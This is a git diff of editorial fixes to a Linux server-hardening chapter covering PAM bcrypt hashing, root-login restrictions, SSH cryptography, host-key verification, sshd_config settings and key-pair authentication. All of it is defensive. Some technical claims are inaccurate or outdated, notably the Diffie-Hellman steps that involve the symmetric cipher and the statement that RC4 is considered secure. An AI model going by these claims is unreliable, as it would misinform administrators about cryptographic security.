 2. `x` is the placeholder for password information. The password is obtained from the `/etc/shadow` file.
 3. `0` or `1000` is the user Id, the root user always has an Id of `0`.
 4. The second `0` or `1000` is the primary group Id for the user, the root user always has a primary group Id of `0`.
-5. `root` or `you,,,` is the comment field. This field can be used to describe the user or user's function. This could be used for contact details, or maybe what the account is used for.
+5. `root` or `you,,,` is the comment field. This field can be used to describe the user or user's function. This could be used for contact details, or perhaps what the account is used for.
 6. `/root` or `/home/you` is the users home directory. For regular users, this would usually be `/home/[you]`. For root, this is `/root`.
 7. `/bin/bash` is the users default shell.
 
 ##### [Consider](https://lists.debian.org/debian-user/2011/04/msg00550.html) changing to Bcrypt
 
-You should find this fairly straight forward on a Debian server. In order to [use bcrypt](https://serverfault.com/questions/10585/enable-blowfish-based-hash-support-for-crypt/11685) with slowpoke blowfish which is the best (very slow) algorithm available for hashing passwords currently, which is obvious by the number of iterations applied by default as noted above, 64 rounds as opposed to `MD5`s 1000 rounds, and `SHA`s 5000 rounds from 2007.
+You should find this fairly straight forward on a Debian server in order to [use bcrypt](https://serverfault.com/questions/10585/enable-blowfish-based-hash-support-for-crypt/11685) with slowpoke blowfish, which is the best (very slow) algorithm available for hashing passwords currently. This is obvious by the number of iterations applied by default as noted above, 64 rounds as opposed to `MD5`s 1000 rounds, and `SHA`s 5000 rounds from 2007.
 
 1. In Debian you need to install the package libpam-unix2
 2. Then you will have to edit the following files under `/etc/pam.d/`, and change all references to `pam_unix.so` to `pam_unix2.so` in the following files:
@@ -1724,13 +1721,13 @@ You should find this fairly straight forward on a Debian server. In order to [us
 * common-password, also while you are in this one, replace the current cipher (probably `sha512`) with `blowfish`
 * common-session
 
-Passwords that are updated after these modifications are made will be computed using blowfish. Existing shadow passwords are not modified until you change them. So you need to change them immediately (one at a time to start with please. Leave root till last) if you expect them to be using the bcrypt KDF. Do this the same way we did above with the `passwd` command.
+Passwords that are updated after these modifications are made will be computed using blowfish. Existing shadow passwords are not modified until you change them. So you need to change them immediately (one at a time to start with, please, leave root until last) if you expect them to be using the bcrypt KDF. Do this the same way we did above with the `passwd` command.
 
-Something to be aware of: If the version of libpam-unix2 that you just installed does not support the existing crypt scheme used to create an existing users password, that user may not be able to log in. You can get around this by having root create a new password for that user, because `passwd` will not ask root for that users existing password.
+Something to be aware of: if the version of libpam-unix2 that you just installed does not support the existing crypt scheme used to create an existing users password, that user may not be able to log in. You can get around this by having root create a new password for that user, because `passwd` will not ask root for that users existing password.
 
 ##### Password GRUB
 
-Consider setting a password for GRUB, especially if your server is directly on physical hardware. If it is on a hypervisor, an attacker has another layer to go through before they can access the guests boot screen.
+Consider setting a password for GRUB, especially if your server is directly on physical hardware. If it is on a hypervisor, an attacker has another layer to go through before they can access the guest's boot screen.
 
 #### Disable Root Logins from All Terminals
 ![](images/ThreatTags/PreventionVERYEASY.png)
@@ -1738,10 +1735,10 @@ Consider setting a password for GRUB, especially if your server is directly on p
 There are a handful of files to [check and/or modify](https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-restrict-console-login) in terms of disabling root logins.
 
 * `/etc/pam.d/login`  
-This file along with the next one enables the `pam_securetty.so` module. When this file along with the next one is properly configured, when root tries to login on an insecure console (that's one that is not listed in the next file), they will not be prompted for a password and will instead receive a message like the following:  
+This file, along with the next one, enables the `pam_securetty.so` module. When this file and the next one are properly configured, if root tries to login on an insecure console (that's one that is not listed in the next file), they will not be prompted for a password and will instead receive a message such as the following:  
 `pam_securetty(login:auth): access denied: tty '/dev/tty1' is not secure :`  
 `Login incorrect`  
-Review and understand the contents of this file. There are plenty of comments, and read the [pam_securetty](http://linux.die.net/man/8/pam_securetty) man page, which also refers to other applicable man pages. By default, you may not need to change anything in here. Do check and make sure that the following line, which provides the possibility to allow logins with null (blank) passwords, has the `nullok` text removed from it:  
+Review and understand the contents of this file. There are plenty of comments, and read the [pam_securetty](http://linux.die.net/man/8/pam_securetty) man page, which also refers to other applicable man pages. By default, you may not need to change anything in here. Do check and make sure that the following line, which allows the possibility of logins with null (blank) passwords, has the `nullok` text removed from it:  
 `auth       required   pam_unix.so nullok`  
 I generally also like to make sure that the following line does not exist, as it allows root to log into the system from the local terminals listed in `/etc/inittab`. A better practise is to only allow low privilege users access to terminals and then elevate privileges once logged in:  
 `auth     requisite  pam_securetty.so`  
@@ -1753,9 +1750,9 @@ This file contains a list of the virtual consoles / tty devices you have.
 * `/etc/security/access.conf`  
 An [alternative](https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-pam-rootaccess) to the previous method is to enable the `pam_access` module and make modifications to this file. Currently everything is commented out by default. Enabling this module and configuring it, allows for finer grained access control, but log messages are lacking. I usually don't touch this module.
 
-Now test that you are unable to log into any of the text terminals (TeleTYpewriter, tty) listed in `/etc/inittab`. Usually these can be accessed by [Ctrl]+[Alt]+[F[1, 2, 3, ...]] if you are dealing with a physical machine. If you are dealing with a hypervisor, attempt to log-in to the guests console via the hypervisor management UI as root, in the case of VMware ESX(i) vSphere. You should no longer be able to.
+Now test that you are unable to log into any of the text terminals (TeleTYpewriter, tty) listed in `/etc/inittab`. Usually these can be accessed by [Ctrl]+[Alt]+[F[1, 2, 3, ...]] if you are dealing with a physical machine. If you are dealing with a hypervisor, attempt to log in to the guest's console via the hypervisor management UI as root, in the case of VMware ESX(i) vSphere. You should no longer be able to do so.
 
-Make sure that if your server is not physical hardware, but is a VM, then the hosts password is long and consists of a random mix of upper case, lower case, numbers, and special characters.
+Make sure that if your server is not physical hardware and is a VM that the host's password is long and consists of a random mix of upper case, lower case, numbers, and special characters.
 
 #### SSH {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh}
 ![](images/ThreatTags/PreventionVERYEASY.png)
@@ -1778,13 +1775,13 @@ First of all, make sure you are using SSH version 2. Version 1 and its progressi
 
 ##### Symmetric Cryptosystems
 
-Often refereed to as "secret key" or "shared secret" encryption. In the case of Symmetrical encryption, typically only a single key is required for both ends of the communication, or a pair of keys in which a simple transformation is required to establish the relationship between them (not to be confused with how Diffie-Hellman (asymmetric) parties establish their secret keys). The single key should be kept secret by the parties involved in the conversation. This key can be used to both encrypt and decrypt messages.
+Often referred to as "secret key" or "shared secret" encryption. In the case of symmetrical encryption, typically only a single key is required for both ends of the communication, or a pair of keys in which a simple transformation is required to establish the relationship between them (not to be confused with how Diffie-Hellman (asymmetric) parties establish their secret keys). The single key should be kept secret by the parties involved in the conversation. This key can be used to both encrypt and decrypt messages.
 
 Some of the commonly used and well known ciphers used for this purpose are the following:
 
 * AES (Advanced Encryption Standard block cipher with either key sizes of 128, 192 or 256 bits, considered highly secure, succeeded DES during the program National Institute of Standards Technology (NIST) began in 1997 for that purpose, which took five years. Approved in December 2001)
 * 3DES (block cipher variant of DES. Increases its security by increasing the key length)
-* ARCFOUR (or RC4 is a stream cipher, used to be an unpatented trade-secret, until the source code was posted on-line anonymously, RC4 is very fast, but less studied than other algorithms. It is considered secure, providing the caveat of never reusing a key is observed.)
+* ARCFOUR (or RC4 as a stream cipher, used to be an unpatented trade-secret, until the source code was posted on-line anonymously, RC4 is very fast, but less studied than other algorithms. It is considered secure, providing the caveat of never reusing a key is observed.)
 * CAST-128/256 (block cipher described in [Request for Comments (RFC) 2144](http://www.rfc-editor.org/rfc/rfc2144.txt), as a DES-like substitution-permutation crypto algorithm, designed in the early 1990s by Carlisle Adams and Stafford Tavares, available on a worldwide royalty-free basis)
 * Blowfish (block cipher invented by Bruce Schneier in 1993, key lengths can vary from 32 to 448 bits. It is much faster than DES and IDEA, though not as fast as ARCFOUR. It has no patents and is intended to be free for all to use. Has received a fair amount of cryptanalytic scrutiny and has proved impervious to attack so far)
 * Twofish (block cipher invented by Bruce Schneier, with the help from a few others, submitted in 1998 to the NIST as a candidate for the AES, to replace DES. It was one of the five finalists in the AES selection process out of 15 submissions. Twofish has no patents and is free for all uses. Key lengths can be 128, 192 or 256 bits. Twofish is also designed to be more flexible than Blowfish.)
@@ -1805,9 +1802,9 @@ Also known as public-key or key-pair encryption, utilises a pair of keys, one wh
 
 Also known as message digests and one-way encryption algorithms. Hash functions create a fixed-length hash value based on the plain-text. Hash functions are often used to determine the integrity of a file, message, or any other data.
 
-If a given hash function is run on a given message twice, the resulting hash value should be identical. Modifying any part of the message has a very high chance of creating an entirely different hash value.
+If a given hash function is run on a message twice, the resulting hash value should be identical. Modifying any part of the message has a very high chance of creating an entirely different hash value.
 
-Any given message should not be able to be re-created from the hash of it.
+Any given message should not be able to be re-created from its hash.
 
 When the symmetric encryption negotiation is being carried out, a Message Authentication Code (MAC) algorithm is selected from the clients default list of MAC's, the first one that is supported on the server is used. You can see the default list by entering `man ssh_config` into a terminal.
 
@@ -1835,39 +1832,39 @@ The SSH client is responsible for initiating the TCP handshake with the server. 
 
 This record is added on first connection to the server, as detailed in the section ["Establishing your SSH Servers Key Fingerprint"](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint) below.
 
-At this stage, a session key is negotiated between the client and server using Diffie-Hellman (DH) as an ephemeral (asymmetric) key exchange algorithm, each combining their own private data with public data from the other party, which allows both parties to arrive at the identical secret symmetric session key. The public and private key pairs used to create the shared secret key in this stage have nothing to do with the client authenticating to the server.
+At this stage, a session key is negotiated between the client and server using Diffie-Hellman (DH) as an ephemeral (asymmetric) key exchange algorithm, each combining their own private data with public data from the other party. This allows both parties to arrive at the identical secret symmetric session key. The public and private key pairs used to create the shared secret key in this stage have nothing to do with the client authenticating to the server.
 
 Now in a little more detail, the Diffie-Hellman key agreement works like this:
 
-1. Both client and server come to agreement on a seed value, that is a large prime number.
-2. Both client and server agree on a symmetric cipher, so that they are both encrypting/decrypting with the same block cipher, usually AES
-3. Each party then creates another prime number of their own to be used as a private key for this ephemeral DH interaction
+1. Both client and server come to agreement on a seed value, commonly a large prime number.
+2. Both client and server agree on a symmetric cipher, so that they are both encrypting/decrypting with the same block cipher, usually AES.
+3. Each party then creates another prime number of their own to be used as a private key for this ephemeral DH interaction.
 4. Each party then create a public key which they exchange with the other party. These public keys are created using the symmetric cipher from step 2, the shared prime number from step 1, and derived from the private key from step 3.
-5. The party receiving the other parties public key, uses this, along with their own private key, and the shared prime number from step 1 to compute their own secret key. Because each party does the same, they both arrive at the same (shared/symmetric/secret) key.
+5. The party receiving the other party's public key, uses this, along with their own private key, and the shared prime number from step 1 to compute their own secret key. Because each party does the same, they both arrive at the same (shared/symmetric/secret) key.
 6. All communications from here on are encrypted with the same shared secret key, the connection from here on is known as the *binary packet protocol*. Each party can use their own shared secret key to encrypt and decrypt, messages from the other party.
 
 **Authenticate the client to the server**
 
 The second stage is to authenticate the client, establishing whether they should be communicating with the server. There are several methods for doing this, the two most common are passwords and key-pair. SSH defaults to passwords, as the lowest common denominator, plus it often helps to have password authentication set-up in order to set-up key-pair authentication, especially if you don't have physical access to the server(s).
 
-SSH key pairs are asymmetric. The server holds the clients public key and is used by the server to encrypt messages that it uses to authenticate the client. The client in turn receives the messages from the server and decrypts them with the private key. If the public key falls into the wrong hands, it's no big deal, because the private key can not be deduced from the public key, and all the authentication public key is used for is verifying that the client holds the private key for it.
+SSH key pairs are asymmetric. The server holds the client's public key and is used by the server to encrypt messages that it uses to authenticate the client. The client in turn receives the messages from the server and decrypts them with the private key. If the public key falls into the wrong hands, it's no big deal, because the private key cannot be deduced from the public key, and the authentication public key is used only for verifying that the client holds the private key for it.
 
 The authentication stage continues directly after the encryption has been established from the previous step.  
 
-1. The client sends the Id of the key pair they want to authenticate as to the server
-2. The server checks the `~/.ssh/authorized_keys` file for the Id of the public keys account that the client is authenticating as
-3. If there is a matching Id for a public key within `~/.ssh/authorized_keys`, the server creates a random number and encrypts it with the public key that had a matching Id
-4. The server then sends the client this encrypted number
+1. The client sends the Id of the key pair they want to authenticate as to the server.
+2. The server checks the `~/.ssh/authorized_keys` file for the Id of the public keys account that the client is authenticating as.
+3. If there is a matching Id for a public key within `~/.ssh/authorized_keys`, the server creates a random number and encrypts it with the public key that had a matching ID.
+4. The server then sends the client this encrypted number.
 5. Now the client needs to prove that it has the matching private key for the Id it sent the server. It does this by decrypting the message the server just sent with the private key, revealing the random number created on the server.
 6. The client then combines the number from the server with the shared session key produced in the session encryption stage and obtains the MD5 hash from this value.
 7. The client then sends the hash back in response to the server.
 8. The server then does the same as the client did in step 6 with the number that it generated, combining it with the shared session key and obtaining the MD5 hash from it. The server then compares this hash with the hash that the client sent it. If they match, then the server communicates to the client that it is successfully authenticated.
 
-Below in the [Key-pair Authentication](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication) section, we work through manually (hands on) setting up Key-pair authentication.
+Below in the [Key-pair Authentication](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication) section, we work through manually (hands on) setting up key-pair authentication.
 
 ##### Establishing your SSH Servers Key Fingerprint {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint}
 
-When you connect to a remote host via SSH that you have not established a trust relationship with before, you are going to be told that the authenticity of the host your attempting to connect to can not be established.
+When you connect to a remote host via SSH that you have not established a trust relationship with before, you are going to be told that the authenticity of the host your attempting to connect to cannot be established.
 
 {linenos=off, lang=Bash}
     you@yourbox ~ $ ssh you@your_server
@@ -1891,9 +1888,9 @@ For example if SSH is using dsa:
 
 `ssh-keygen -lf ssh_host_dsa_key.pub`
 
-If you try the command on either the private or publick key you will be given the public keys fingerprint, which is exactly what you need for verifying the authenticity from the client side.
+If you try the command on either the private or public key you will be given the public key's fingerprint, which is exactly what you need for verifying the authenticity from the client side.
 
-Sometimes you may need to force the output of the fingerprint_hash algorithm, as ssh-keygen may be displaying it in a different form than it is shown when you try to SSH for the first time. The default when using ssh-keygen to show the key fingerprint is sha256, unless it is an old version, but in order to compare apples with apples you may need to specify md5 if that is what is being shown when you attempt to login. You would do that by issuing the following command:
+Sometimes you may need to force the output of the fingerprint_hash algorithm, as ssh-keygen may be displaying it in a different form than it is shown when you try to SSH for the first time. The default when using ssh-keygen to show the key fingerprint is sha256, unless it is an old version, but in order to compare apples with apples, you may need to specify md5 if that is what is being shown when you attempt to login. You would do that by issuing the following command:
 
 `ssh-keygen -lE md5 -f ssh_host_dsa_key.pub`
 
@@ -1907,18 +1904,18 @@ Alternatively this can be specified in the clients `~/.ssh/config` file as per t
     Host <your_server>
         FingerprintHash md5
 
-Prior to [OpenSSH 6.8](http://www.openssh.com/txt/release-6.8) The fingerprint was provided as a hexadecimal md5 hash. Now it is displayed as base64 sha256 by default. You can check which version of SSH you are using with:
+Prior to [OpenSSH 6.8](http://www.openssh.com/txt/release-6.8) the fingerprint was provided as a hexadecimal md5 hash. Now it is displayed as base64 sha256 by default. You can check which version of SSH you are using with:
 
 {linenos=off, lang=Bash}
     sshd -v
 
 You can find additional details on the man pages for the options, both ssh-keygen and ssh.
 
-Do not connect remotely and then run the above command, as the machine you are connected to is still untrusted. The command could be dishing you up any string replacement if it is an attackers machine. You need to run the command on the physical box or get someone you trust (your network admin) to do this and hand you the fingerprint.
+Do not connect remotely and then run the above command, as the machine you are connected to is still untrusted. The command could be serving you any string replacement if it is an attackers machine. You need to run the command on the physical box, or get someone you trust (your network admin) to do this and hand you the fingerprint.
 
-Now when you try to establish your SSH connection for the first time, you can check that the remote host is actually the host you think it is by comparing the output of one of the previous commands with what SSH on your client is telling you the remote hosts fingerprint is. If it is different, it is time to start tracking down the origin of the host masquerading as the address your trying to log in to.
+Now when you try to establish your SSH connection for the first time, you can check that the remote host is actually the host you think it is by comparing the output of one of the previous commands with what SSH on your client is telling you the remote host's fingerprint is. If it is different, it is time to start tracking down the origin of the host masquerading as the address your trying to log in to.
 
-Now, when you get the following message when attempting to SSH to your server, due to something or somebody changing the hosts key fingerprint:
+If you get the following message when attempting to SSH to your server, due to something or somebody changing the host's key fingerprint
 
 {linenos=off, lang=Bash}
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -1936,15 +1933,15 @@ Now, when you get the following message when attempting to SSH to your server, d
     RSA host key for your_server has changed and you have requested strict checking.
     Host key verification failed.
 
-The same applies. Check that the fingerprint is indeed the intended target hosts key fingerprint. If it is, you can continue to log in.
+then the same applies. Check that the fingerprint is indeed the intended target host's key fingerprint. If it is, you can continue to log in.
 
-Now when you type `yes`, the fingerprint is added to your clients:  
+Now, when you type `yes`, the fingerprint is added to your clients:  
 `/home/you/.ssh/known_hosts` file,  
 so that next time you try and login via SSH, your client will already know your server.
 
 ##### Hardening SSH {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-hardening-ssh}
 
-There are a bunch of things you can do to minimise SSH being used as an attack vector. Let us walk through some now.
+There are a bunch of things you can do to minimise SSH being used as an attack vector. Let's walk through some now.
 
 After any changes, restart SSH daemon as root (using sudo) to apply the changes.
 
@@ -1969,7 +1966,7 @@ If you wanted to allow access to the SSH daemon from `1.1.1.x` and `10.0.0.5`, b
 {title="/etc/hosts.deny", linenos=off, lang=Bash}
     ALL: ALL
 
-If you wanted to deny all only to SSH, so that users not listed in `hosts.allow` could potentially log into other services. you would set the `hosts.deny` up like the following:
+If you wanted to deny all only to SSH, so that users not listed in `hosts.allow` could potentially log into other services,. you would set the `hosts.deny` up as follows:
 
 {title="/etc/hosts.deny", linenos=off, lang=Bash}
     sshd: ALL
@@ -1978,9 +1975,9 @@ There are also commented examples in the above files and check the man page for 
 
 **Changes to the servers `/etc/ssh/sshd_config` file**
 
-To tighten security up considerably Make the necessary changes to your servers:  
+To tighten security up considerably, make the necessary changes to your servers:  
 `/etc/ssh/sshd_config` file.  
-Start with the changes I list here. When you change things like setting up `AllowUsers` or any other potential changes that could lock you out of the server. It is a good idea to be logged in via one shell when you exit another and test it. This way if you have locked yourself out, you will still be logged in on one shell to adjust the changes you have made. Unless you have a need for multiple users, you can lock it down to a single user. You can even lock it down to a single user from a specific host.
+Start with the changes I list here. When you change things such as setting up `AllowUsers`, or any other potential changes that could lock you out of the server, it is a good idea to be logged in via one shell when you exit another and test it. This way if you have locked yourself out, you will still be logged in on one shell to adjust the changes you have made. Unless you have a need for multiple users, you can lock it down to a single user. You can even lock it down to a single user from a specific host.
 
 {title="/etc/ssh/sshd_config", linenos=off, lang=Bash}
     # If specified, login is allowed only for users that match one of the patterns.
@@ -2009,7 +2006,7 @@ Start with the changes I list here. When you change things like setting up `Allo
     # noise if your web server is open to the internet, as many automated scanns target port 22.
     Port 202
 
-As you can see, these changes are very simple, but so many do not do it. Every positive security change you make to the low hanging fruit lifts it that little bit higher for the attacker to reach, making it less economical for them.
+As you can see, these changes are very simple, but so many do not do it. Every positive security change you make to low hanging fruit elevates that much higher for the attacker to reach, making it less economical for them.
 
 You can also consider installing and configuring [denyhosts](https://www.digitalocean.com/community/articles/how-to-install-denyhosts-on-ubuntu-12-04)
 
@@ -2027,18 +2024,18 @@ If you want to see successful logins, enter the following:
     # Or list the last logged in users from /var/log/wtmp unless modified by an attacker.
     last -ad
 
-If you are sending your logs off-site in real-time, it will not matter to much if the attacker tries to cover their tracks by modifying these types of files. If you are checking the integrity of your system files frequently with one of the Host Intrusion Detection Systems ([HIDS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids)) we discuss a little further on in this chapter, then you will know you are under attack and will be able to take measures quickly, providing you have someone engaged watching out for these attacks, as discussed in the People chapter of Fascicle 0. If your HIDS is on the same machine that is under attack, then it is quite likely that any decent attacker is going to find it before they start modifying files and some-how render it ineffective. That is where [Stealth](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth) shines, as it is so much harder to find where it is operating from, if the attacker even knows it is.
+If you are sending your logs off-site in real-time, it will not matter too much if the attacker tries to cover their tracks by modifying these types of files. If you are checking the integrity of your system files frequently with one of the Host Intrusion Detection Systems ([HIDS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids)) we discuss a little further on in this chapter, then you will know you are under attack, and will be able to take measures quickly, provided that you have someone engaged watching out for these attacks, as discussed in the People chapter of Fascicle 0. If your HIDS is on the same machine that is under attack, then it is quite likely that any decent attacker is going to find it before they start modifying files and somehow render it ineffective. That is where [Stealth](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth) shines, as it is so much harder to find where it is operating from, assuming the attacker even knows it is.
 
 {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication}
 **Key-pair Authentication**
 
-The details around how the client authenticates to the server are above in part 2 of the [SSH Connection Procedure](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure) section. This section shows you how to set-up key-pair authentication, as opposed to password authentication.
+The details around how the client authenticates to the server are above in Part 2 of the [SSH Connection Procedure](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure) section. This section shows you how to set-up key-pair authentication, as opposed to password authentication.
 
-Make sure you use a long pass-phrase (this is your second factor of authentication) for your key-pair, that you store in a password vault with all your other passwords. You are using a decent password vault right? If your pass-phrase and private key is compromised, your hardening effort will be softened or compromised.
+Make sure you use a long passphrase (this is your second factor of authentication) for your key-pair, that you store in a password vault with all your other passwords. You are using a decent password vault right? If your passphrase and private key is compromised, your hardening effort will be softened or compromised.
 
-My feeling after a lot of reading is that currently RSA with large keys (The default RSA size is 2048 bits) is a good option for key-pair authentication. Personally I like to go for 4096 these days.
+My feeling after a lot of reading is that currently RSA with large keys (The default RSA size is 2048 bits) is a good option for key-pair authentication. Personally, I like to go for 4096 these days.
 
-Create your key-pair if you have not already and set-up key-pair authentication. Key-pair auth is more secure and allows you to log in without a password. Your pass-phrase should be stored in your keyring. You will just need to provide your local password once (each time you log into your local machine) when the keyring prompts for it.
+Create your key-pair if you have not already and set-up key-pair authentication. Key-pair auth is more secure and allows you to log in without a password. Your passphrase should be stored in your keyring. You will just need to provide your local password once (each time you log into your local machine) when the keyring prompts for it.
 
 On your client machine that you want to create the key-pair and store them:
 
@@ -2054,7 +2051,7 @@ Optionally, the new private key can be added to `id_rsa.keystore` if it hasn't b
 {linenos=off, lang=Bash}
     ssh-add id_rsa
 
-Then enter your pass-phrase.
+Then enter your passphrase.
 
 Now we need to get the public key we have just created (`~/.ssh/id_rsa.pub`) from our client machine into our servers `~/.ssh/` directory.  
 You can `scp` it, but this means also logging into the server and creating the:  
@@ -2064,9 +2061,9 @@ and appending (`>>`) the contents of id_rsa.pub to `~/.ssh/authorized_keys`. The
 {linenos=off, lang=Bash}
     ssh-copy-id "you@your_server -p [your non default port]"
 
-This will copy the public key straight into the `~/.ssh/authorized_keys` file on your_server. You may be prompted to type `yes` if it is the first time you have connected to the server, that the authenticity of the server you are trying to connect to can not be established and you want to continue. Remember I mentioned this above in the [Establishing your SSH Servers Key Fingerprint](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint) section? Make sure you check the servers Key Fingerprint and do not just blindly accept it, this is where our security solutions break down... due to human defects.
+This will copy the public key straight into the `~/.ssh/authorized_keys` file on your_server. You may be prompted to type `yes` if it is the first time you have connected to the server, that the authenticity of the server you are trying to connect to cannot be established and you want to continue. I mentioned this above in the [Establishing your SSH Servers Key Fingerprint](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint) section. Make sure you check the servers Key Fingerprint and do not just blindly accept it, this is where our security solutions break down due to human defects.
 
-Also make sure the following permissions and ownership on the server are correct:
+Also, make sure the following permissions and ownership on the server are correct:
 
 {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication-ssh-perms}
 {linenos=off, lang=Bash}
@@ -2084,12 +2081,12 @@ You may need to tunnel SSH once the server is placed into the DMZ. Usually this 
     # The -A option is useful for hopping from your network internal server to other servers.
     ssh your_webserver_account@your_routers_wan_interface -A -p [router wan non default port] 
 
-If you are wanting to SSH from your LAN host to your DMZ web server:
+If you want to SSH from your LAN host to your DMZ web server:
 
 {linenos=off, lang=Bash}
     ssh your_webserver_account@your_routers_lan_interface -p [router wan non default port] 
 
-Before you try that though, you will need to set-up the port forwards and add the WAN and/or LAN rule to your router. How you do this will depend on what you are using for a router.
+Before you try that though, you will need to set up the port forwards and add the WAN and/or LAN rule to your router. How you do this will depend on what you are using for a router.
 
 I have blogged extensively over the years on SSH. The Additional Resources chapter has links to my resources for a plethora of information on configuring and using SSH in many different ways.
 
@@ -2102,17 +2099,17 @@ I just thought I would throw sshuttle in here as well, it has nothing to do with
     # -v: verbosity, -r: remote
     # 0/0: forwards all local traffic over the SSH channel.
     sshuttle --dns -vvr your_shell_account@your_ssh_shell 0/0
-    # That is it, now all comms go over your SSH tunnel. So simple. Actually easier than a VPN
+    # That is it, now all comms go over your SSH tunnel. So simple. Actually easier than a VPN.
 
-As opposed to manually specifying socks and then having to tell your browser to proxy through `localhost` and use the same port you defined after the socks (`-D`) option, and then having to do the same for any other programmes that want to use the same tunnel:
+It's a pain to manually specify socks and then tell your browser to proxy through `localhost`, and use the same port you defined after the socks (`-D`) option, and then do the same for any other programmes that want to use the same tunnel:
    
 {linenos=off, lang=Bash}
     ssh -D [any spare port] your_shell_account@your_ssh_shell
-    # Now go set-up proxies for all consumers. What a pain!
+    # Now go set up proxies for all consumers. What a pain!
     # On top of that, DNS queries are not forced through the tunnel,
     # So censorship can still bite you.
 
-Dnscrypt can help conceal DNS queries, but that would be more work. Another offering I've used is the [bitmask](https://bitmask.net/) VPN [client](https://dl.bitmask.net/linux/) which does a lot more than traditional VPN clients, bitmask starts an egress firewall that rewrites all DNS packets to use the VPN. bitmask is sponsored by the [LEAP Encryption Access Project](https://leap.se/) and looks very good, I've used this, and the chaps on the #riseup IRC channel on the indymedia server are really helpful to. Bitmask is working on Debian, Ubuntu, and Mint 17, but not so well on Mint 18 when I tried it, but this will probably change.
+Dnscrypt can help conceal DNS queries, but that would be more work. Another offering I've used is the [bitmask](https://bitmask.net/) VPN [client](https://dl.bitmask.net/linux/) which does a lot more than traditional VPN clients. Bitmask starts an egress firewall that rewrites all DNS packets to use the VPN. Bitmask is sponsored by the [LEAP Encryption Access Project](https://leap.se/) and looks very good, I've used it, and the chaps on the #riseup IRC channel on the indymedia server are really helpful to. Bitmask works on Debian, Ubuntu, and Mint 17, but not so well on Mint 18 when I tried it, but this will probably change.
 
 #### Disable Boot Options
 ![](images/ThreatTags/PreventionVERYEASY.png)
